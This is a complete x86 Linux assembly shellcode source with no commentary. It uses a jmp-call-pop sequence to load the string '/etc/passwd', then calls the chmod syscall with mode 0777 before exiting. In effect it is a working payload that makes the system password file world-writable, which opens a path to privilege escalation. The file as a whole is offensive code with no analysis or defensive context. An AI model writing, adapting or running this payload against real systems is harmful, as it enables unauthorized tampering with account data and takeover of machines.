section .text

global _start

_start:
	jmp short shellcodestr

decode:
	pop ebx
	xor ecx,ecx
	mov cx,0x1ff

	xor eax,eax
	mov al,15
	int 80h
	
	xor eax,eax
	mov eax,1
	xor ebx,ebx
	int 80h


shellcodestr:
	call decode
	shellcode : db "/etc/passwd"
